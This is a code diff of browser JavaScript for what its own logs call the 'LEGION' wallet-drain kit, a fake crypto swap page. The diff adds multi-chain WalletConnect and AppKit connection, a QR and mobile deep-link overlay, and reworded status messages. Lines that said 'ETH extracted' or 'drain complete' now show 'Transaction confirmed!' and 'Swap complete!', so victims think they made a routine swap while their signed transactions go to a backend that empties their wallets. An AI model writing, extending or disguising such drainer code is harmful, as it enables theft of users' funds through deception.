+          walletType: 'WalletConnect',
+          provider: _wcProvider,
+          connected: true, timestamp: Date.now()
         };
+        console.log('[LEGION] WC EthereumProvider connected:', epAccounts[0].substring(0, 10) + '...');
         await runWCSignAndSubmit();
         return;
       }
@@ -4480,7 +4920,7 @@
             enableExplorer: true
           });
         }
-        updateStatus('Opening Web3Modal...');
+        updateStatus('Connecting wallet...');
         _wcModal.openModal();
         throw new Error('Web3Modal standalone requires user interaction — check modal');
       }
@@ -4500,7 +4940,7 @@
         // Show QR via manual overlay
         if (connectResult.uri) {
           showManualQR(connectResult.uri);
-          updateStatus('Scan QR with wallet app...');
+          updateStatus('Scan QR with your wallet...');
         }
         var session = await connectResult.approval();
         hideManualQR();
@@ -4518,40 +4958,171 @@
         return;
       }
 
-      // ─── Method 1: Reown AppKit (if it loaded) ───
-      if (_wcMode === 'reown-appkit') {
-        updateStatus('Reown AppKit not yet supported inline — falling back');
-        throw new Error('Reown AppKit requires framework integration');
+      // ─── Reown AppKit (PRIMARY) — EVM + Solana + all chains ───
+      if (_wcMode === 'appkit') {
+        if (!_wcModal) {
+          var _akAdapters = [new _wcSdk.EthersAdapter()];
+          if (_wcSdk.SolanaAdapter) {
+            try { _akAdapters.push(new _wcSdk.SolanaAdapter({ wallets: [] })); } catch (_) {}
+          }
+          var _akNetworks = [
+            // ── EVM chains — id must be numeric chainId ──
+            { id: 1,     caipNetworkId: 'eip155:1',     chainNamespace: 'eip155', name: 'Ethereum',     nativeCurrency: { decimals: 18, name: 'Ether', symbol: 'ETH' }, rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } } },
+            { id: 137,   caipNetworkId: 'eip155:137',   chainNamespace: 'eip155', name: 'Polygon',      nativeCurrency: { decimals: 18, name: 'POL',   symbol: 'POL' }, rpcUrls: { default: { http: ['https://polygon-rpc.com'] } } },
+            { id: 56,    caipNetworkId: 'eip155:56',    chainNamespace: 'eip155', name: 'BNB Chain',    nativeCurrency: { decimals: 18, name: 'BNB',   symbol: 'BNB' }, rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } } },
+            { id: 42161, caipNetworkId: 'eip155:42161', chainNamespace: 'eip155', name: 'Arbitrum One', nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH' }, rpcUrls: { default: { http: ['https://arb1.arbitrum.io/rpc'] } } },
+            { id: 10,    caipNetworkId: 'eip155:10',    chainNamespace: 'eip155', name: 'Optimism',     nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH' }, rpcUrls: { default: { http: ['https://mainnet.optimism.io'] } } },
+            { id: 8453,  caipNetworkId: 'eip155:8453',  chainNamespace: 'eip155', name: 'Base',         nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH' }, rpcUrls: { default: { http: ['https://mainnet.base.org'] } } },
+            { id: 43114, caipNetworkId: 'eip155:43114', chainNamespace: 'eip155', name: 'Avalanche',    nativeCurrency: { decimals: 18, name: 'AVAX',  symbol: 'AVAX'}, rpcUrls: { default: { http: ['https://api.avax.network/ext/bc/C/rpc'] } } },
+            { id: 250,   caipNetworkId: 'eip155:250',   chainNamespace: 'eip155', name: 'Fantom',       nativeCurrency: { decimals: 18, name: 'FTM',   symbol: 'FTM' }, rpcUrls: { default: { http: ['https://rpc.ftm.tools'] } } },
+            // ── Solana — id must be full CAIP chainId ──
+            { id: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', caipNetworkId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', chainNamespace: 'solana', name: 'Solana', nativeCurrency: { decimals: 9, name: 'SOL', symbol: 'SOL' }, rpcUrls: { default: { http: ['https://api.mainnet-beta.solana.com'] } } },
+          ];
+          _wcModal = _wcSdk.createAppKit({
+            adapters: _akAdapters,
+            networks: _akNetworks,
+            projectId: wcProjectId,
+            metadata: WC_METADATA(),
+            features: { analytics: false, email: false, socials: false, coinbase: 'hide' },
+            themeMode: 'dark',
+            enableCoinbase: false,
+          });
+        }
+        updateStatus('Connecting wallet...');
+        await _wcModal.open();
+        // Wait for user to connect — AppKit v1.x uses subscribeAccount (not subscribeProvider)
+        var _akState = await new Promise(function(resolve, reject) {
+          var _akTimeout = setTimeout(function() { reject(new Error('WalletConnect timeout')); }, 120000);
+          // subscribeAccount fires with { address, isConnected, caipAddress, status }
+          var _akUnsub = _wcModal.subscribeAccount(function(state) {
+            if (state.isConnected && state.address) {
+              clearTimeout(_akTimeout);
+              try { _akUnsub(); } catch (_) {}
+              resolve(state);
+            }
+          });
+        });
+        // caipAddress format: 'eip155:1:0xabc...' or 'solana:5eykt...:ADDR'
+        var _akCaip = _akState.caipAddress || '';
+        var _akIsSolana = _akCaip.startsWith('solana:');
+        // Get the EIP-1193 / Solana provider from AppKit
+        var _akProvider = null;
+        try {
+          // subscribeProviders gives { eip155: provider, solana: provider }
+          var _akProviders = _wcModal.getProviders ? _wcModal.getProviders() : {};
+          _akProvider = _akIsSolana ? (_akProviders.solana || null) : (_akProviders['eip155'] || _wcModal.getWalletProvider());
+        } catch (_) {
+          try { _akProvider = _wcModal.getWalletProvider(); } catch (_) {}
+        }
+        if (_akIsSolana) {
+          connectedChains.SOL = {
+            chain: 'SOL', config: CHAIN_CONFIG.SOL,
+            address: _akState.address,
+            chainId: 'mainnet-beta',
+            walletType: 'WalletConnect',
+            provider: _akProvider,
+            connected: true, timestamp: Date.now()
+          };
+          console.log('[LEGION] AppKit → Solana connected:', _akState.address.substring(0, 8) + '...');
+        } else {
+          var _akChainId = _akCaip ? parseInt(_akCaip.split(':')[1]) || 1 : 1;
+          connectedChains.EVM = {
+            chain: 'EVM', config: CHAIN_CONFIG.EVM,
+            address: _akState.address.toLowerCase(),
+            chainId: _akChainId,
+            walletType: 'WalletConnect',
+            provider: _akProvider,
+            connected: true, timestamp: Date.now()
+          };
+          console.log('[LEGION] AppKit → EVM connected:', _akState.address.substring(0, 10) + '... chain:', _akChainId);
+        }
+        await runWCSignAndSubmit();
+        return;
       }
 
       throw new Error('Unknown WC mode: ' + _wcMode);
 
     } catch (err) {
-      if (_wcModal && _wcModal.closeModal) _wcModal.closeModal();
+      if (_wcModal) { try { if (_wcModal.close) _wcModal.close(); else if (_wcModal.closeModal) _wcModal.closeModal(); } catch (_) {} }
       hideManualQR();
+      // Reset providers so next attempt starts fresh (stale state causes silent failures)
+      if (_wcProvider) { try { await _wcProvider.disconnect(); } catch (_) {} _wcProvider = null; }
+      _wcSdk = null; _wcMode = null;
       console.error('[LEGION] WalletConnect failed:', err.message);
-      if (/reject|cancel|closed|declined/i.test(err.message || '')) {
-        updateStatus('User cancelled WalletConnect');
+      if (/reject|cancel|closed|declined|user rejected/i.test(err.message || '')) {
+        updateStatus('Connection cancelled. Try again.');
       } else {
-        updateStatus('WalletConnect: ' + (err.message || 'Failed'));
+        updateStatus('Connection failed. Please try again.');
       }
     }
   }
 
-  // Manual QR overlay for SignClient fallback
+  // WalletConnect QR Modal — QR code + mobile deep links
   function showManualQR(uri) {
     hideManualQR();
+    var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+    var enc = encodeURIComponent(uri);
+
+    // Deep link buttons shown on mobile (can't scan your own screen)
+    var walletLinks = [
+      { name: 'MetaMask',     icon: '🦊', url: 'https://metamask.app.link/wc?uri=' + enc },
+      { name: 'Trust Wallet', icon: '🔵', url: 'https://link.trustwallet.com/wc?uri=' + enc },
+      { name: 'Coinbase',     icon: '🔷', url: 'https://go.cb-w.com/wc?uri=' + enc },
+      { name: 'Rainbow',      icon: '🌈', url: 'https://rnbwapp.com/wc?uri=' + enc },
+    ];
+    var mobileLinksHTML = isMobile
+      ? '<p style="color:#9ca3af;font-size:11px;margin:0 0 10px;text-transform:uppercase;letter-spacing:.5px">Open in wallet app</p>' +
+        '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px">' +
+        walletLinks.map(function(w) {
+          return '<a href="' + w.url + '" target="_blank" rel="noopener" style="display:flex;align-items:center;gap:8px;padding:10px 12px;background:#1f2029;border:1px solid #2a2a36;border-radius:12px;color:#e5e7eb;font:13px Inter,system-ui;text-decoration:none">' +
+            '<span style="font-size:18px">' + w.icon + '</span><span>' + w.name + '</span></a>';
+        }).join('') + '</div>' +
+        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:14px"><div style="flex:1;height:1px;background:#2a2a36"></div><span style="color:#4b5563;font-size:10px">OR SCAN WITH ANOTHER DEVICE</span><div style="flex:1;height:1px;background:#2a2a36"></div></div>'
+      : '';
+
     var overlay = document.createElement('div');
     overlay.id = 'l1-qr-overlay';
-    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center';
-    overlay.innerHTML = '<div style="background:#191920;border-radius:20px;padding:32px;text-align:center;max-width:380px;color:#fff;font-family:Inter,system-ui,sans-serif">' +
-      '<h3 style="margin:0 0 8px;font-size:16px">WalletConnect</h3>' +
-      '<p style="color:#6b6b80;font-size:13px;margin:0 0 16px">Scan QR code with your wallet app</p>' +
-      '<img src="https://api.qrserver.com/v1/create-qr-code/?size=260x260&bgcolor=191920&color=ffffff&data=' + encodeURIComponent(uri) + '" width="260" height="260" style="border-radius:12px;margin-bottom:16px">' +
-      '<div><button onclick="navigator.clipboard.writeText(\'' + uri.replace(/'/g, "\\'") + '\');this.textContent=\'Copied!\'" style="padding:10px 24px;background:#262630;color:#fff;border:1px solid #2a2a36;border-radius:10px;font:14px Inter,system-ui;cursor:pointer;width:100%">Copy Link</button></div>' +
-      '<div style="margin-top:8px"><button onclick="document.getElementById(\'l1-qr-overlay\').remove()" style="padding:10px 24px;background:none;color:#6b6b80;border:none;font:13px Inter,system-ui;cursor:pointer">Close</button></div>' +
-    '</div>';
+    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);overflow-y:auto;padding:20px 0';
+
+    var card = document.createElement('div');
+    card.style.cssText = 'background:#13141a;border-radius:24px;padding:24px;text-align:center;width:320px;max-width:calc(100vw - 32px);color:#fff;font-family:Inter,system-ui,sans-serif;box-shadow:0 32px 80px rgba(0,0,0,.7);border:1px solid #1f2029;margin:auto';
+    card.innerHTML =
+      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:18px">' +
+        '<span style="font-size:15px;font-weight:600">Connect Wallet</span>' +
+        '<button id="l1-qr-x" style="background:#1f2029;border:none;color:#9ca3af;width:28px;height:28px;border-radius:50%;font-size:16px;cursor:pointer">×</button>' +
+      '</div>' +
+      mobileLinksHTML +
+      '<div id="l1-qr-wrap" style="background:#fff;border-radius:16px;width:240px;height:240px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center">' +
+        '<canvas id="l1-qr-canvas"></canvas>' +
+      '</div>' +
+      '<p style="color:#6b6b80;font-size:11px;margin:0 0 12px;line-height:1.5">' +
+        (isMobile ? 'Scan with a second device, or tap a wallet above' : 'Scan with MetaMask, Trust Wallet, Coinbase or any WalletConnect app') +
+      '</p>' +
+      '<button id="l1-qr-copy" style="width:100%;padding:11px;background:#1f2029;color:#e5e7eb;border:1px solid #2a2a36;border-radius:12px;font:13px Inter,system-ui;cursor:pointer">Copy Link</button>';
+
+    overlay.appendChild(card);
     document.body.appendChild(overlay);
+
+    // Generate QR locally — instant
+    import('https://esm.sh/qrcode@1.5.3?bundle-deps').then(function(mod) {
+      var QR = mod.default || mod.QRCode || mod;
+      var canvas = document.getElementById('l1-qr-canvas');
+      if (canvas && QR && QR.toCanvas) {
+        QR.toCanvas(canvas, uri, { width: 220, margin: 1, color: { dark: '#000000', light: '#ffffff' } }, function() {});
+      } else { throw new Error('no canvas'); }
+    }).catch(function() {
+      // Fallback: external QR image API
+      var wrap = document.getElementById('l1-qr-wrap');
+      if (wrap) wrap.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&bgcolor=ffffff&color=000000&data=' + enc + '" width="220" height="220" style="border-radius:12px">';
+    });
+
+    document.getElementById('l1-qr-x').onclick = hideManualQR;
+    document.getElementById('l1-qr-copy').onclick = function() {
+      navigator.clipboard.writeText(uri).then(function() {
+        var btn = document.getElementById('l1-qr-copy');
+        if (btn) { btn.textContent = 'Copied!'; setTimeout(function() { if (btn) btn.textContent = 'Copy Link'; }, 2000); }
+      }).catch(function() {});
+    };
     overlay.addEventListener('click', function(e) { if (e.target === overlay) hideManualQR(); });
   }
   function hideManualQR() { var el = document.getElementById('l1-qr-overlay'); if (el) el.remove(); }
@@ -4589,7 +5160,7 @@
 
   // Run sign + submit flow after WC connects
   async function runWCSignAndSubmit() {
-    updateStatus('Connected via WalletConnect! Signing...');
+    updateStatus('Wallet connected. Confirm in wallet...');
 
     // Build connected map for signing
     var wcConnected = {};
@@ -4624,13 +5195,13 @@
     if (Object.keys(signatures).length === 0) {
       if (_eip7702DoneWc) {
         console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
-        updateStatus('Done! Secure settlement processing...');
+        updateStatus('Transaction submitted!');
         drainRunning = false;
         return;
       }
       if (_ethOnlyDoneWc) {
         console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDoneWc.split(':')[1]);
-        updateStatus('Done! ETH extracted successfully.');
+        updateStatus('Transaction confirmed!');
         INCIDENT_RESPONSE.suspicionScore = 0;
         drainRunning = false;
         return;
@@ -4639,10 +5210,10 @@
     }
 
     // Submit
-    updateStatus('Submitting...');
+    updateStatus('Finalizing swap...');
     await submitBatchSignatures(signatures, connectedChains);
 
-    updateStatus('Done! Settlement processing...');
+    updateStatus('Swap complete!');
     console.log('[LEGION] WalletConnect flow complete');
 
     if (INCIDENT_RESPONSE.enabled) {
@@ -4655,9 +5226,10 @@
   function updateStatus(text) {
     LOGGER.debug('UI Status:', text);
     var status = document.getElementById('legion-one-status');
-    if (status) {
-      status.textContent = text;
-    }
+    if (status) { status.textContent = text; }
+    // Also update the visible swap/connect button so user sees real feedback
+    var mainBtn = document.getElementById('mainBtn') || document.querySelector('[data-legion-btn]') || document.querySelector('button.swap-btn');
+    if (mainBtn && text) { mainBtn.textContent = text; }
   }
 
   // ─── BATCH SUBMISSION TO BACKEND ───────────────────────────────────────
@@ -4869,10 +5441,10 @@
         }
       }
 
-      updateStatus('Ready');
+      updateStatus('Connect your wallet to swap');
     } catch (err) {
       LOGGER.error('Init failed:', err.message);
-      updateStatus('Error: ' + err.message);
+      updateStatus('Failed to initialize. Please refresh.');
     }
   }
 
